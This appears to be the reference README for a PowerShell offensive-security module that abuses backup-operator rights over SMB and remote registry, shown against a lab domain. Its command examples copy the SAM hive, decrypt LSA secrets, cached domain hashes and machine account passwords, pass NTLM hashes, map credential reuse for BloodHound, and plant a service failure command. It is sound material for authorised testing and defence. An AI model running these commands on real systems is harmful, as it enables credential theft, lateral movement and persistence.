# Titanis.TBO.Smb2 PowerShell Module

This module provides the TBO SMB2 PowerShell provider and cmdlets for backup-operator workflows.

If you're new, start with [Docs/Guide.md](Guide.md) (short, task-focused) and use this file as the full reference.
For a docs index, see [Docs/README.md](README.md).

## Quick Start

```powershell
Import-Module .\Titanis.TBO.Smb2.psd1 -Force

Set-TBOConnectOptions `
  -ServerName corp1-web01.corp1.lab.home-labs.lol `
  -HostName corp1-web01.corp1.lab.home-labs.lol `
  -UserName psx_l_backupop `
  -UserDomain corp1.lab.home-labs.lol `
  -Password 'YourSecurePassword'

New-PSDrive -Name tbo -PSProvider 'TBO.Smb2' -Root '\\corp1-web01.corp1.lab.home-labs.lol\C$'
Set-Location tbo:\
Get-ChildItem
```

## Provider (TBO.Smb2)

The `TBO.Smb2` provider exposes SMB shares through a PowerShell drive. Connections are opened on-demand and use backup intent.

```powershell
# Use dynamic parameters on New-PSDrive to set credentials or SMB options.
New-PSDrive -Name tbo -PSProvider 'TBO.Smb2' -Root '\\corp1-web01.corp1.lab.home-labs.lol\C$' `
  -UserName psx_l_backupop -UserDomain corp1.lab.home-labs.lol -Password 'YourSecurePassword'

Set-Location tbo:\
Get-ChildItem
```

Provider-qualified UNC paths can be used without creating a drive:

```powershell
Get-ChildItem TBO.Smb2::\\corp1-web01.corp1.lab.home-labs.lol\C$\Windows
```

Writing text content is supported via `Set-Content`/`Add-Content` on the provider or the `Out-TBOSmbFile` cmdlet:

```powershell
'testing' | Out-TBOSmbFile -Path tbo:\Temp\test.txt
Add-Content tbo:\Temp\test.txt -Value 'more'
Get-Content tbo:\Temp\test.txt
```

Use `Get-Help about_TBO_Smb2_Provider` for supported item types, dynamic parameters, and limitations.

Root listings (`tbo:\` or `TBO.Smb2::\\server\share`) skip reparse metadata by default to avoid per-entry opens on large roots. Use `-IncludeRootReparseInfo` (alias `-RootReparseInfo`) on `New-PSDrive` or `Set-TBOConnectOptions` to enable it.

On Windows, `Get-Acl` and `Set-Acl` work with `tbo:\` and provider-qualified UNC paths. Snapshot paths are read-only. Local NTFS mode (`\\localhost\<Drive>$`) supports `Get-Content`/`Set-Content`/`Add-Content`/`Clear-Content` and security descriptor operations, and supports `@GMT-` snapshot tokens for read-only navigation/reads when a matching local VSS shadow copy exists.

```powershell
# Local NTFS mode (Windows only) bypasses SMB by using \\localhost\<Drive>$ UNC paths.
New-PSDrive -Name tbo-local -PSProvider 'TBO.Smb2' -Root '\\localhost\C$'
New-Item tbo-local:\Temp\tbo-ilz-test -ItemType Directory
New-Item tbo-local:\Temp\tbo-ilz-test\file.txt -ItemType File
Set-Content tbo-local:\Temp\tbo-local.txt -Value 'testing'
Add-Content tbo-local:\Temp\tbo-local.txt -Value 'more'
Get-Content tbo-local:\Temp\tbo-local.txt
Clear-Content tbo-local:\Temp\tbo-local.txt
Remove-Item tbo-local:\Temp\tbo-ilz-test -Recurse
```

For SYSTEM/TrustedInstaller validation steps and additional local-mode notes, see `Docs/DevGuide/PowerShellSmb2LocalNtfs.md`.

## Provider (TBO.Reg) (Preview)

The `TBO.Reg` provider exposes the remote registry through a per-server PSDrive. The drive root is the server name, and the top-level items are hives (HKLM, HKCU, HKU, etc). Keys enumerate subkeys by default; use `-IncludeProperties` to populate per-subkey value names in the Property column and `-IncludeValues` (or `-IncludeData`) to include values. The default value is shown as `(Default)`.

```powershell
New-PSDrive -Name tbo-reg -PSProvider 'TBO.Reg' -Root corp1-web01.corp1.lab.home-labs.lol
Get-ChildItem tbo-reg:\
Get-ChildItem tbo-reg:\HKLM\SOFTWARE -IncludeProperties
Get-ChildItem tbo-reg:\HKLM\SOFTWARE -IncludeValues
```

Write operations use `New-Item`/`Remove-Item` for keys and `Set-ItemProperty`/`Remove-ItemProperty` for values.
`New-ItemProperty`, `Rename-ItemProperty`, `Copy-ItemProperty`, and `Move-ItemProperty` are not supported.
Use `Get-Help about_TBO_Reg_Provider` for provider-specific behavior and limitations.

```powershell
New-Item -Path tbo-reg:\HKLM\SOFTWARE\TBO
Set-ItemProperty -Path tbo-reg:\HKLM\SOFTWARE\TBO -Name InstallId -Value "abc123"
Set-ItemProperty -Path tbo-reg:\HKLM\SOFTWARE\TBO -Name Flags -Type DwordLE -Value 1
Remove-ItemProperty -Path tbo-reg:\HKLM\SOFTWARE\TBO -Name Flags
Remove-Item -Path tbo-reg:\HKLM\SOFTWARE\TBO -Recurse
```

Use `Get-Content` for registry value data (typed values when available, or `byte[]` for binary types). `Set-Content` is not supported.

```powershell
Get-Content tbo-reg:\HKLM\SOFTWARE\TBO\InstallId
Get-Content tbo-reg:\HKLM\SOFTWARE\TBO\Flags
```

## Cmdlets

Mutating cmdlets (Copy/Set/New/Remove) support `-WhatIf` and `-Confirm`.

### Connect-TBOSmbServer

Initializes the TBO.Smb2 provider for a server name. Connections are opened on-demand by later cmdlets.

```powershell
Connect-TBOSmbServer -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName psx_l_backupop -UserDomain corp1.lab.home-labs.lol -Password 'YourSecurePassword'
```

### Disconnect-TBOSmbServer

Closes cached SMB connections, sessions, and tree connects for a server or all servers.

```powershell
Disconnect-TBOSmbServer -ServerName corp1-web01.corp1.lab.home-labs.lol
Disconnect-TBOSmbServer -ServerName corp1-web01.corp1.lab.home-labs.lol -Force
Disconnect-TBOSmbServer -All
```

### Set-TBOConnectOptions

Sets connection defaults used by TBO cmdlets, the TBO.Smb2 provider, and the TBO.Reg provider. Supports the same dynamic parameters as `New-PSDrive` (credentials, SMB dialects, ciphers, signing, name resolution, and registry retry policy).

Per-server settings take precedence over global defaults, and `New-PSDrive` dynamic parameters override the resolved defaults for that specific connection. When `-ServerName` is provided, the supplied parameters merge onto the existing per-server settings (unspecified values are preserved). If no per-server settings exist, the merge uses the current global defaults. When `-ServerName` is omitted, the global defaults are updated by merging onto the existing defaults.

Changing options that affect the winreg fingerprint invalidates cached registry sessions for the target server (or all servers when updating global defaults). See `Docs/WinregSessionCaching.md` for details.

```powershell
Set-TBOConnectOptions -ServerName corp1-web01.corp1.lab.home-labs.lol -HostName corp1-web01.corp1.lab.home-labs.lol -UserName psx_l_backupop -UserDomain corp1.lab.home-labs.lol -Password 'YourSecurePassword'
Set-TBOConnectOptions -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName psx_l_backupop -UserDomain corp1.lab.home-labs.lol -NtlmHash "aad3b435b51404eeaad3b435b51404ee:0123456789abcdef0123456789abcdef"
Set-TBOConnectOptions -ServerName corp1-web01.corp1.lab.home-labs.lol -TicketCache C:\temp\krb5cc
Set-TBOConnectOptions -ServerName corp1-web01.corp1.lab.home-labs.lol -AesKey 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef -Kdc corp1-dc01.corp1.lab.home-labs.lol
Set-TBOConnectOptions -ServerName corp1-web01.corp1.lab.home-labs.lol -RetryPolicy Practical -RetryCount 3 -RetryDelayMs 100 -RetryMaxDelayMs 1000 -RetryJitterMs 100
Set-TBOConnectOptions -ServerName corp1-web01.corp1.lab.home-labs.lol -IncludeRootReparseInfo
```

### Get-TBOCacheInfo

Shows information about the persistent TBO cache (schema version and row counts). The cache is stored on disk (SQLite) and persists between PowerShell sessions.

Cache path resolution order:

- `-Path` parameter (cache cmdlets) or `-CachePath` (cmdlets that support `-Cache`)
- `TITANIS_TBO_CACHE` environment variable (file path, or `1/true/yes` to use default)
- Default: `%LOCALAPPDATA%\TBO\cache.sqlite3` (Windows)

```powershell
Get-TBOCacheInfo
Get-TBOCacheInfo -Path C:\Temp\tbo-cache.sqlite3
$env:TITANIS_TBO_CACHE = 'C:\Temp\tbo-cache.sqlite3'; Get-TBOCacheInfo
```

Cache ingestion defaults:

- Set `TITANIS_TBO_CACHE_INGEST` to `1/true/yes` to enable cache writes by default for cmdlets that support `-Cache`.
- Use `-CachePath` to write to a specific cache file for a single invocation.
- Use `-Cache:$false` to suppress cache writes for a single invocation when global ingestion is enabled.

```powershell
$env:TITANIS_TBO_CACHE_INGEST = 'true'
Get-TBORegSamHashes -ServerName corp1-web01.corp1.lab.home-labs.lol
Get-TBORegSamHashes -ServerName corp1-web01.corp1.lab.home-labs.lol -CachePath C:\Temp\tbo-cache.sqlite3
Get-TBORegSamHashes -ServerName corp1-web01.corp1.lab.home-labs.lol -Cache:$false
```

### Clear-TBOCache

Deletes all rows from the cache database.

```powershell
Clear-TBOCache
Clear-TBOCache -WhatIf
Clear-TBOCache -Confirm:$false
```

### Remove-TBOCacheEntry

Deletes one or more entries by type and id. When removing machines/principals/credentials, related observations are deleted first.

```powershell
Remove-TBOCacheEntry -Type Observation -Id 1
Remove-TBOCacheEntry -Type Credential -Id 12,13,14
```

### Get-TBOCacheCredentialReuse

Lists credentials observed on multiple machines, grouped by machine and principal context.

```powershell
# Show NTHashes observed on 2+ machines.
Get-TBOCacheCredentialReuse -Kind NTHash -MinimumMachineCount 2

# Narrow to a specific credential identifier (ex: NTHash).
Get-TBOCacheCredentialReuse -Kind NTHash -Identifier 8846f7eaee8fb117ad06bdd830b7586c -MinimumMachineCount 2
```

### Add-TBOCacheObservation

Adds an observation edge to the persistent cache (machine, optional principal identity, optional credential identity). Other cmdlets use this same ingestion surface.

```powershell
# Record an NTHash observed for a local account on a host.
Add-TBOCacheObservation -ServerName corp1-web01.corp1.lab.home-labs.lol `
  -PrincipalName Administrator `
  -CredentialKind NTHash `
  -CredentialIdentifier 8846f7eaee8fb117ad06bdd830b7586c `
  -SourceKind Get-TBORegSamHashes

# Record a credential observation without principal context.
Add-TBOCacheObservation -ServerName corp1-web01.corp1.lab.home-labs.lol `
  -CredentialKind NTHash `
  -CredentialIdentifier 8846f7eaee8fb117ad06bdd830b7586c `
  -SourceKind Manual
```

### Export-TBOCacheJson

Exports the persistent cache as a JSON document (machines, principals, credentials, observations, DPAPI master keys, DPAPI blob hits, write activities) for offline ingestion (for example, Nemesis).

```powershell
# Export as JSON.
Export-TBOCacheJson | Set-Content -Path .\tbo-cache-export.json -Encoding utf8

# Export a specific cache file.
Export-TBOCacheJson -Path C:\Temp\tbo-cache.sqlite3 | Set-Content -Path .\tbo-cache-export.json -Encoding utf8
```

### Export-TBOCacheGraph

Exports the persistent cache as a graph for external visualization. Supports `Json` (nodes+edges), GraphViz `Dot`, and BloodHound `OpenGraph` (https://bloodhound.specterops.io/opengraph/schema).

```powershell
# Export as JSON.
Export-TBOCacheGraph -Format Json | Set-Content -Path .\tbo-cache-graph.json -Encoding utf8

# Export as GraphViz DOT.
Export-TBOCacheGraph -Format Dot | Set-Content -Path .\tbo-cache-graph.dot -Encoding ascii

# Export as BloodHound OpenGraph JSON.
Export-TBOCacheGraph -Format OpenGraph | Set-Content -Path .\tbo-cache-opengraph.json -Encoding utf8
```

### Set-TBOSmbConnectOptions (Deprecated)

Deprecated shim for `Set-TBOConnectOptions`. Uses the same dynamic parameters and behavior.

```powershell
Set-TBOSmbConnectOptions -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName psx_l_backupop -UserDomain corp1.lab.home-labs.lol -Password 'YourSecurePassword'
```

### Set-TBORegConnectOptions (Deprecated)

Deprecated shim for `Set-TBOConnectOptions`. Use it when you need an older script name; behavior is identical.

```powershell
Set-TBORegConnectOptions -ServerName corp1-web01.corp1.lab.home-labs.lol -RetryPolicy Practical -RetryCount 3 -RetryDelayMs 100 -RetryMaxDelayMs 1000 -RetryJitterMs 100
```

### Copy-TBOSmbItem

Copies files or directories between local paths and SMB paths using backup intent. Supports UNC or `tbo:\` paths. Use `-Force` (alias `-Overwrite`) to overwrite existing destinations. Directory copies are recursive; use `-CreateDirectories` to create missing destination paths.

```powershell
Copy-TBOSmbItem -Source tbo:\Windows\System32\config\SAM -Destination C:\Temp\SAM.bak
Copy-TBOSmbItem -Source tbo:\Windows\System32\Microsoft\Protect\S-1-5-18 -Destination C:\Temp\MasterKeys -CreateDirectories
Copy-TBOSmbItem -Source C:\Temp\local.txt -Destination tbo:\Temp\local.txt -CreateDirectories
Copy-TBOSmbItem -Source C:\Temp\local.txt -Destination tbo:\Temp\local.txt -CreateDirectories -Cache -CachePath C:\Temp\tbo-cache.sqlite3
Copy-TBOSmbItem -Source C:\Temp\local.txt -Destination tbo:\Temp\local.txt -Force
```

### Out-TBOSmbFile

Writes text content to an SMB path using backup intent. Accepts UNC or `tbo:\` paths.

```powershell
'testing' | Out-TBOSmbFile -Path tbo:\Temp\test.txt
'testing' | Out-TBOSmbFile -Path tbo:\Temp\test.txt -Cache -CachePath C:\Temp\tbo-cache.sqlite3
Get-Content tbo:\Temp\test.txt
'more' | Out-TBOSmbFile -Path tbo:\Temp\test.txt -Append
```

### Get-TBOSmbSnapshots

Lists available VSS snapshots for a file or directory.

```powershell
Get-TBOSmbSnapshots -Path tbo:\Windows\System32\config
Get-TBOSmbSnapshots -Path \\corp1-web01\C$\Windows\System32\config
Get-TBOSmbSnapshots -Path tbo-local:\Windows\System32\config
Set-Location tbo:\@GMT-2026.01.25-20.47.30\Windows\System32\config
```

### Get-TBOSmbStreams

Lists the data streams of a file or directory.

```powershell
Get-TBOSmbStreams -Path tbo:\Temp\local.txt
Get-TBOSmbStreams -Path \\corp1-web01.corp1.lab.home-labs.lol\C$\Temp\local.txt
Get-TBOSmbStreams -Path tbo-local:\Temp\local.txt
```

### Get-TBOSmbSessions

Lists active SMB sessions on the server. Some detail levels may require administrative rights; use `-Level Level1` or `-Level Level10` if higher levels return access denied.

```powershell
Get-TBOSmbSessions -ServerName corp1-web01.corp1.lab.home-labs.lol
Get-TBOSmbSessions -ServerName corp1-web01.corp1.lab.home-labs.lol -Level Level1
```

### Get-TBOSmbOpenFiles

Lists files open on the server via the srvsvc RPC interface. BasePath uses srvsvc conventions (drive roots like `C:\` or `\\` for pipes) and accepts UNC or `tbo:\` paths. Requires administrative rights (or equivalent) on the target server.

```powershell
Get-TBOSmbOpenFiles -ServerName corp1-web01.corp1.lab.home-labs.lol
Get-TBOSmbOpenFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -BasePath tbo:\Windows -OpenBy psx_l_backupop
```

### Get-TBOSmbShares

Lists SMB shares on the server via srvsvc. Some detail levels may require administrative rights; use `-Level Level1` if higher levels return access denied.

```powershell
Get-TBOSmbShares -ServerName corp1-web01.corp1.lab.home-labs.lol  # Requires Admin Privs
Get-TBOSmbShares -ServerName corp1-web01.corp1.lab.home-labs.lol -Level Level1  # Non-Priv
```

### Get-TBOSmbNics

Queries SMB network interfaces for a server. Accepts UNC or `tbo:\` paths; if the UNC path omits a share, IPC$ is used.

```powershell
Get-TBOSmbNics -Path \\corp1-web01.corp1.lab.home-labs.lol
Get-TBOSmbNics -Path tbo:\
```

### Watch-TBOSmb

Watches a remote directory for changes. Accepts UNC or `tbo:\` paths. Snapshot paths are not supported.

```powershell
Watch-TBOSmb -Path tbo:\Temp
Watch-TBOSmb -Path \\corp1-web01.corp1.lab.home-labs.lol\C$\Temp -Recursive -ContinueOnErrors -BufferSize 4096
```

### Snapshot Navigation (TimeWarp)

Use the @GMT token from Get-TBOSmbSnapshots to navigate a snapshot. Snapshot paths are read-only.

```powershell
$token = (Get-TBOSmbSnapshots -Path tbo:\temp | Select-Object -First 1).Token
Set-Location "tbo:\$token\temp"
Get-ChildItem
```

### Provider Item Operations

Use native PowerShell cmdlets for links, mount points, and touch-style updates.

```powershell
# Create a junction (mount point) or symlink.
New-Item -Path tbo:\Mounts\AppData -ItemType Junction -MountPointTarget 'C:\ProgramData'
New-Item -Path tbo:\Links\Logs -ItemType Symlink -TargetPath 'C:\Windows\System32\LogFiles'

# Remove the link or mount point (inverse of create).
Remove-Item -Path tbo:\Mounts\AppData

# Update timestamps/attributes (touch behavior).
Set-ItemProperty -Path tbo:\Temp\example.txt -Name LastWriteTime -Value (Get-Date)
Set-ItemProperty -Path tbo:\Temp\example.txt -Name Attributes -Value 'Hidden, ReadOnly'
```

### Get-TBOSmbSecurityDescriptor

Reads a security descriptor from a file or directory and returns a portable `Titanis.Winterop.Security.SecurityDescriptor` by default. Use `-AsSddl`, `-AsBytes`, or `-AsWindows` (Windows only) to change output format.
When using UNC paths, the server name must match the name used in `Set-TBOConnectOptions` (for example, FQDN vs short name). A mismatch can yield "context does not match any mechanisms supported by the server."
Use `-Sections` to control which components are retrieved (default: Owner, Group, DACL).

```powershell
$sd = Get-TBOSmbSecurityDescriptor -Path tbo:\Windows
$sddl = Get-TBOSmbSecurityDescriptor -Path \\corp1-web01.corp1.lab.home-labs.lol\C$\Windows -AsSddl
$localSddl = Get-TBOSmbSecurityDescriptor -Path \\localhost\C$\Windows -AsSddl
$winSd = Get-TBOSmbSecurityDescriptor -Path tbo:\Windows -AsWindows
$daclOnly = Get-TBOSmbSecurityDescriptor -Path tbo:\Windows -Sections Dacl
```

### Set-TBOSmbSecurityDescriptor

Writes a security descriptor to a file or directory from a portable `SecurityDescriptor`.
Use `-Sections` to limit which parts of the descriptor are applied (default: Owner, Group, DACL).
The input can be a portable `SecurityDescriptor`, an SDDL string, raw bytes, or Windows security descriptor objects. SDDL and Windows descriptor inputs are Windows-only; on Linux use portable or raw bytes.

```powershell
$sd = Get-TBOSmbSecurityDescriptor -Path tbo:\Windows
Set-TBOSmbSecurityDescriptor -Path tbo:\Windows -SecurityDescriptor $sd -Cache
Set-TBOSmbSecurityDescriptor -Path tbo:\Windows -SecurityDescriptor $sd -Sections Dacl
$sddl = "O:BAG:BAD:(A;;FA;;;SY)"
Set-TBOSmbSecurityDescriptor -Path tbo:\Windows -SecurityDescriptor $sddl -Sections Dacl
```

### TBOSD Helper

Converts registry security descriptor values to and from portable `SecurityDescriptor` instances. Use the helper when registry values store base64-encoded security descriptors.

```powershell
$sdBytes = (Get-TBORegChildItem -ServerName corp1-web01.corp1.lab.home-labs.lol -Path 'HKLM\SYSTEM\CurrentControlSet\Services\Wuauserv\Security' -IncludeValues -IncludeData).Bytes
$sd = [Titanis.Tbo.Smb2.PowerShell.TBOSD]::FromRegistryBinary($sdBytes)

$base64 = [Titanis.Tbo.Smb2.PowerShell.TBOSD]::ToRegistryBase64($sd)
$sd2 = [Titanis.Tbo.Smb2.PowerShell.TBOSD]::FromRegistryBase64($base64)

# Windows-only raw security descriptor
$raw = [Titanis.Tbo.Smb2.PowerShell.TBOSD]::FromRegistryBinaryAsWindows($sdBytes)
```

### Registry Cmdlets (Remote + Local)

Registry cmdlets support:
- Remote registry access via MS-RRP (`-ServerName <host>`), using the winreg pipe with backup/restore semantics. Session caching behavior is documented in `Docs/WinregSessionCaching.md`.
- Local registry access (`-ServerName localhost`), using local Win32 registry APIs (no MS-RRP/SMB).

#### Local Registry Mode (localhost)

Cmdlets:

```powershell
Get-TBORegKey -ServerName localhost -Path HKLM\SOFTWARE
Get-TBORegChildItem -ServerName localhost -Path HKLM\SOFTWARE -IncludeValues -IncludeData
```

Provider:

```powershell
New-PSDrive -Name tbo-reg-local -PSProvider 'TBO.Reg' -Root localhost
Get-ChildItem tbo-reg-local:\HKLM\SOFTWARE -IncludeValues -IncludeData
```

Write examples (safe path under HKCU):

```powershell
New-TBORegKey -ServerName localhost -Path HKCU\SOFTWARE\TBO-Test -Cache
Set-TBORegValue -ServerName localhost -Path HKCU\SOFTWARE\TBO-Test -Name InstallId -Type String -Value "abc123" -Cache
Get-TBORegValue -ServerName localhost -Path HKCU\SOFTWARE\TBO-Test -Name InstallId
Remove-TBORegValue -ServerName localhost -Path HKCU\SOFTWARE\TBO-Test -Name InstallId -Cache
Remove-TBORegKey -ServerName localhost -Path HKCU\SOFTWARE\TBO-Test -Cache
```

Security descriptors (SACL is not implemented yet for local mode; see `TBO-twi.9`):

```powershell
$sd = Get-TBORegSecurityDescriptor -ServerName localhost -Path HKCU\SOFTWARE -Sections Dacl
Set-TBORegSecurityDescriptor -ServerName localhost -Path HKCU\SOFTWARE\TBO-Test -SecurityDescriptor $sd -Sections Dacl -Cache
```

#### Get-TBORegKey

Gets metadata for a registry key.

```powershell
Get-TBORegKey -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE
Get-TBORegKey -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE -IncludeClass
```

#### Get-TBORegSecurityDescriptor

Reads a security descriptor for a registry key. Use `-AsSddl`, `-AsBytes`, or `-AsWindows` (Windows only) to change output format.

```powershell
Get-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE
Get-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE -AsSddl
```

#### Set-TBORegSecurityDescriptor

Writes a security descriptor to a registry key. Input can be a portable `SecurityDescriptor`, SDDL string, raw bytes, or Windows security descriptor objects. SDDL and Windows descriptor inputs are Windows-only. Use `-Sections` to limit which parts are applied (default: `Dacl`).

```powershell
$sd = Get-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE -Sections Dacl
Set-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE -SecurityDescriptor $sd -Sections Dacl -Cache

$sddl = "O:BAG:BAD:(A;;KR;;;SY)"
Set-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE -SecurityDescriptor $sddl -Sections Dacl
```

#### Get-TBORegSessions

Enumerates user session SIDs from HKEY_USERS on the remote host. SYSTEM SIDs are excluded by default.

```powershell
Get-TBORegSessions -ServerName corp1-web01.corp1.lab.home-labs.lol
```

#### Get-TBORegServices

Enumerates service registry keys (defaults to HKLM\SYSTEM\CurrentControlSet\Services) and returns service metadata plus security descriptors.
Use `-AsSddl` or `-AsWindows` to review service DACLs in alternate formats.

```powershell
Get-TBORegServices -ServerName corp1-web01.corp1.lab.home-labs.lol
Get-TBORegServices -ServerName corp1-web01.corp1.lab.home-labs.lol -AsWindows
Get-TBORegServices -ServerName corp1-web01.corp1.lab.home-labs.lol -AsSddl
Get-TBORegServices -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'TestService*'
Get-TBORegServices -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'TestService*' -AsSddl | Select-Object KeyName, SecurityDescriptor
```

#### Get-TBORegServiceDetails

Returns extended registry-backed service metadata including core configuration, dependency lists, Parameters subkey values, security descriptors, and whether an _SC_ credential exists.

```powershell
Get-TBORegServiceDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'MDCoreSvc'
Get-TBORegServiceDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'TestService*'
Get-TBORegServiceDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'TestService2' | Select-Object -Expand FailureActionsInfo
Get-TBORegServiceDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'wuauserv' | Select-Object -Expand TriggerInfo
```

TriggerInfo entries now include the registry key path and raw value data for round-trip edits.

```powershell
$svc = Get-TBORegServiceDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'wuauserv'
$trigger = $svc.TriggerInfo | Select-Object -First 1
$trigger.Values | Format-Table Name, ValueType, Value

# Example: toggle the trigger action using the raw value data.
Set-TBORegValue -ServerName $svc.ServerName -Path $trigger.KeyPath -Name 'Action' -Type DwordLE -Value 1
```

The helper class `TboRegServiceTriggerScenarios` provides common trigger setups equivalent to `sc.exe triggerinfo`.

```powershell
$svc = Get-TBORegServiceDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'wuauserv'
$triggerPath = "HKLM\SYSTEM\CurrentControlSet\Services\$($svc.KeyName)\TriggerInfo\1"
New-TBORegKey -ServerName $svc.ServerName -Path $triggerPath

$values = [Titanis.Tbo.Smb2.PowerShell.TboRegServiceTriggerScenarios]::StartOnNetworkOn()
foreach ($value in $values) {
  Set-TBORegValue -ServerName $svc.ServerName -Path $triggerPath -Name $value.Name -Type $value.ValueType -Value $value.Value
}
```

```powershell
# Firewall port open trigger (port/protocol/image/service are encoded as a STRING trigger data item)
$triggerPath = "HKLM\SYSTEM\CurrentControlSet\Services\$($svc.KeyName)\TriggerInfo\2"
New-TBORegKey -ServerName $svc.ServerName -Path $triggerPath

$values = [Titanis.Tbo.Smb2.PowerShell.TboRegServiceTriggerScenarios]::StartOnFirewallPortOpen(
  "445",
  "TCP",
  "C:\Windows\System32\svchost.exe",
  "LanmanServer")
foreach ($value in $values) {
  Set-TBORegValue -ServerName $svc.ServerName -Path $triggerPath -Name $value.Name -Type $value.ValueType -Value $value.Value
}
```

FailureActionsInfo can be written, but use this for research only: bad values can prevent services from starting.
The helper class `TboRegServiceFailureActionScenarios` generates valid FailureActions binary data and related values.

```powershell
$svc = Get-TBORegServiceDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'TestService2'
$servicePath = "HKLM\SYSTEM\CurrentControlSet\Services\$($svc.KeyName)"
$values = [Titanis.Tbo.Smb2.PowerShell.TboRegServiceFailureActionScenarios]::RunCommandFirst(
  "C:\Windows\System32\notepad.exe")

foreach ($value in $values) {
  Set-TBORegValue -ServerName $svc.ServerName -Path $servicePath -Name $value.Name -Type $value.ValueType -Value $value.Value
}
```

#### Get-TBOScheduledTasks

Enumerates scheduled task definitions from the Tasks folder and maps them to TaskCache registry entries for task IDs and registry timestamps.

```powershell
Get-TBOScheduledTasks -ServerName corp1-web01.corp1.lab.home-labs.lol
Get-TBOScheduledTasks -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'OneDrive*'
Get-TBOScheduledTasks -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\Microsoft\Windows\*'
```

#### Get-TBOScheduledTaskDetails

Reads scheduled task XML definitions, parses triggers/actions/principal/settings, and returns both task security descriptors:

- Task file security descriptor (`SecurityDescriptor` / `SecurityDescriptorBytes`) for `C:\Windows\System32\Tasks\...`
- TaskCache registry security descriptor (`TaskSecurityDescriptor` / `TaskSecurityDescriptorBytes`) stored under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\<task>\SD`

Use `-AsSddl` or `-AsWindows` (Windows only) to change the security descriptor format (applies to both security descriptor properties).

```powershell
Get-TBOScheduledTaskDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'TestTask'
Get-TBOScheduledTasks -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'TestTask' | Get-TBOScheduledTaskDetails
Get-TBOScheduledTaskDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\Microsoft\Windows\Defrag\*' -AsSddl
```

#### Set-TBOScheduledTaskSecurityDescriptor

Writes the TaskCache registry security descriptor for a task. This modifies the security descriptor stored at `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\<task>\SD` and does not change the ACL on the task file in `C:\Windows\System32\Tasks`.

```powershell
# View the TaskCache SD as SDDL, then write it back (edit the SDDL to modify permissions).
$task = Get-TBOScheduledTaskDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'TestTask' -AsSddl
$task.TaskSecurityDescriptor
Set-TBOScheduledTaskSecurityDescriptor -ServerName $task.ServerName -Path $task.TaskPath -SecurityDescriptor $task.TaskSecurityDescriptor -Cache -Confirm:$false
```

#### Get-TBORegTCPIP

Reads TCP/IP configuration from `Tcpip` and `Tcpip6` registry keys, including DNS/search list, routing, and interface-level settings. Interface GUIDs are mapped to friendly names when available.

```powershell
Get-TBORegTCPIP -ServerName corp1-web01.corp1.lab.home-labs.lol
Get-TBORegTCPIP -ServerName corp1-web01.corp1.lab.home-labs.lol -Protocol IPv6
Get-TBORegTCPIP -ServerName corp1-web01.corp1.lab.home-labs.lol |
  Select-Object -Expand Interfaces |
  Where-Object { $_.DhcpEnabled -eq $false }
```

#### Get-TBORegLsaKeys

Derives the boot key (syskey) and LSA encryption key from the remote registry.

```powershell
Get-TBORegLsaKeys -ServerName corp1-web01.corp1.lab.home-labs.lol
```

#### Get-TBORegLsaSecrets

Decrypts LSA secrets from the remote registry using the derived LSA key.
Binary secrets like `DPAPI_SYSTEM`, `NL$KM`, `$MACHINE.ACC`, and `Kerberos*` are returned as hex strings in `Secret`.
`DPAPI_SYSTEM` is also split into machine/user halves (`DpapiMachineKey` and `DpapiUserKey`).

```powershell
Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol
Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'NL$KM'
```

#### Get-TBORegCachedCredentials

Decrypts cached domain credentials stored under `HKLM\SECURITY\Cache` and returns DCC1/DCC2 hashes with usernames.

```powershell
Get-TBORegCachedCredentials -ServerName corp1-web01.corp1.lab.home-labs.lol
Get-TBORegCachedCredentials -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'NL$1'

# Cache DCC hashes for later reuse queries.
Get-TBORegCachedCredentials -ServerName corp1-web01.corp1.lab.home-labs.lol -Cache
Get-TBORegCachedCredentials -ServerName corp1-web02.corp1.lab.home-labs.lol -Cache
Get-TBOCacheCredentialReuse -Kind DCC2 -MinimumMachineCount 2
```

#### Get-TBORegMachineAccount

Decrypts the $MACHINE.ACC secret and returns the machine account password and NT hash.
When the password is not readable text, it is emitted as hex.

```powershell
Get-TBORegMachineAccount -ServerName corp1-web01.corp1.lab.home-labs.lol
Get-TBORegLsaKeys -ServerName corp1-web01.corp1.lab.home-labs.lol | Get-TBORegMachineAccount
```

#### Get-TBORegSecretLocations

Enumerates well-known registry locations that may hold secrets (LSA secrets, cached credentials, autologon, and user hive locations like PuTTY or VNC).

```powershell
Get-TBORegSecretLocations -ServerName corp1-web01.corp1.lab.home-labs.lol
